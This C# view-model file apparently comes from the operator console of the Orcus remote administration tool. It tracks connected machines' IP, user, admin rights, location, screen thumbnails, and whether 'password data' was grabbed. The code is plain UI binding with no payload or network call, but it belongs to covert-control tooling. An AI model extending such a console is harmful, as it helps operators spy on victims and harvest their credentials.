using System;
using System.Globalization;
using System.Windows;
using System.Windows.Media.Imaging;
using Orcus.Shared.Connection;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.Core.ClientManagement
{
    public class ClientViewModel : PropertyChangedBase
    {
        private string _activeWindow;
        private int _apiVersion;
        private double _frameworkVersion;
        private string _geoLocationCountry;
        private string _geoLocationTwoLetter;
        private string _group;
        private bool _informationGrabbed;
        private string _isAddress;
        private bool _isAdministrator;
        private bool _isComputerInformationAvailable;
        private bool _isOnline;
        private bool _isPasswordDataAvailable;
        private bool _isServiceRunning;
        private string _language;
        private DateTime _lastSeen;
        private DateTime _onlineSince;
        private string _osName;
        private OSType _osType;
        private int _port;
        private BitmapSource _thumbnail;
        private string _userName;
        private int _version;

        public ClientViewModel(BaseClientInformation clientInformation)
        {
            Id = clientInformation.Id;
            IsOnline = clientInformation.IsOnline;
            ApiVersion = clientInformation.ApiVersion;
            Language = clientInformation.Language;
            IsServiceRunning = clientInformation.IsServiceRunning;
            IsAdministrator = clientInformation.IsAdministrator;
            OsType = clientInformation.OsType;
            UserName = clientInformation.UserName;
            Group = clientInformation.Group;
            OsName = clientInformation.OsName;
            GeoLocationTwoLetter = clientInformation.LocatedCountry;
        }

        public int Id { get; }

        public bool IsOnline
        {
            get { return _isOnline; }
            set
            {
                if (SetProperty(value, ref _isOnline) && !value)
                    Thumbnail = null;
            }
        }

        public bool InformationGrabbed
        {
            get { return _informationGrabbed; }
            set { SetProperty(value, ref _informationGrabbed); }
        }

        public int ApiVersion
        {
            get { return _apiVersion; }
            set { SetProperty(value, ref _apiVersion); }
        }

        public string Language
        {
            get { return _language; }
            set { SetProperty(value, ref _language); }
        }

        public bool IsServiceRunning
        {
            get { return IsOnline && _isServiceRunning; }
            set { SetProperty(value, ref _isServiceRunning); }
        }

        public bool IsAdministrator
        {
            get { return IsOnline && _isAdministrator; }
            set { SetProperty(value, ref _isAdministrator); }
        }

        public OSType OsType
        {
            get { return _osType; }
            set { SetProperty(value, ref _osType); }
        }

        public string UserName
        {
            get { return _userName; }
            set { SetProperty(value, ref _userName); }
        }

        public string Group
        {
            get { return _group; }
            set { SetProperty(value, ref _group); }
        }

        public string ActiveWindow
        {
            get { return _activeWindow; }
            set { SetProperty(value, ref _activeWindow); }
        }

        public string LanguageName
        {
            get
            {
                try
                {
                    var cultureInfo = new CultureInfo(Language);
                    return Settings.Current.Language.CultureInfo.ThreeLetterISOLanguageName ==
                           CultureInfo.InstalledUICulture.ThreeLetterISOLanguageName
                        ? cultureInfo.DisplayName
                        : cultureInfo.EnglishName;
                }
                catch (Exception)
                {
                    return Language;
                }
            }
        }

        public string Country
        {
            get
            {
                try
                {
                    return new RegionInfo(Language).TwoLetterISORegionName;
                }
                catch (Exception)
                {
                    return new CultureInfo(Language).TwoLetterISOLanguageName;
                }
            }
        }

        public string GeoLocationTwoLetter
        {
            get { return _geoLocationTwoLetter; }
            set
            {
                if (SetProperty(value, ref _geoLocationTwoLetter) && value != null)
                {
                    try
                    {
                        var region = new RegionInfo(value);
                        GeoLocationCountry = Settings.Current.Language.CultureInfo.ThreeLetterISOLanguageName ==
                                             CultureInfo.InstalledUICulture.ThreeLetterISOLanguageName
                            ? region.DisplayName
                            : region.EnglishName;
                    }
                    catch (Exception)
                    {
                        GeoLocationCountry = string.Format((string) Application.Current.Resources["UnknownRegion"],
                            value);
                    }
                }
            }
        }

        public string GeoLocationCountry
        {
            get { return _geoLocationCountry; }
            set { SetProperty(value, ref _geoLocationCountry); }
        }

        public string OsName
        {
            get { return _osName; }
            set { SetProperty(value, ref _osName); }
        }

        public DateTime LastSeen
        {
            get { return IsOnline ? new DateTime(DateTime.Now.Year + 1, 1, 1) : _lastSeen; }
            set { SetProperty(value, ref _lastSeen); }
        }

        public bool IsComputerInformationAvailable
        {
            get { return _isComputerInformationAvailable; }
            set { SetProperty(value, ref _isComputerInformationAvailable); }
        }

        public bool IsPasswordDataAvailable
        {
            get { return _isPasswordDataAvailable; }
            set { SetProperty(value, ref _isPasswordDataAvailable); }
        }

        public DateTime OnlineSince
        {
            get { return _onlineSince; }
            set { SetProperty(value, ref _onlineSince); }
        }

        public string IpAddress
        {
            get { return _isAddress; }
            set { SetProperty(value, ref _isAddress); }
        }

        public int Port
        {
            get { return _port; }
            set { SetProperty(value, ref _port); }
        }

        public int Version
        {
            get { return _version; }
            set { SetProperty(value, ref _version); }
        }

        public double FrameworkVersion
        {
            get { return _frameworkVersion; }
            set { SetProperty(value, ref _frameworkVersion); }
        }

        public BitmapSource Thumbnail
        {
            get { return _thumbnail; }
            set
            {
                if (SetProperty(value, ref _thumbnail))
                    ThumbnailTimestamp = DateTime.Now;
            }
        }

        public DateTime ThumbnailTimestamp { get; private set; }

        public void Disconnected()
        {
            IsOnline = false;
            LastSeen = DateTime.Now;
            Thumbnail = null;
            ActiveWindow = null;
        }

        public void Update(ClientInformation clientInformation)
        {
            InformationGrabbed = true;

            var offlineClient = clientInformation as OfflineClientInformation;
            if (offlineClient != null)
            {
                LastSeen = offlineClient.LastSeen;
                IsOnline = false;
            }
            else
            {
                IsOnline = true;
                var onlineClient = (OnlineClientInformation)clientInformation;
                OnlineSince = onlineClient.OnlineSince;
                IpAddress = onlineClient.IpAddress;
                Port = onlineClient.Port;
                Version = onlineClient.Version;
                FrameworkVersion = onlineClient.FrameworkVersion;
            }

            UserName = clientInformation.UserName;
            OsType = clientInformation.OsType;
            ApiVersion = clientInformation.ApiVersion;
            IsAdministrator = clientInformation.IsAdministrator;
            IsServiceRunning = clientInformation.IsServiceRunning;
            Language = clientInformation.Language;
            OsName = clientInformation.OsName;
            if (clientInformation.LocatedCountry != null)
                GeoLocationTwoLetter = clientInformation.LocatedCountry;

            IsComputerInformationAvailable = clientInformation.IsComputerInformationAvailable;
            IsPasswordDataAvailable = clientInformation.IsPasswordDataAvailable;

            OnPropertyChanged(nameof(LanguageName));
            OnPropertyChanged(nameof(Country));
        }
    }
}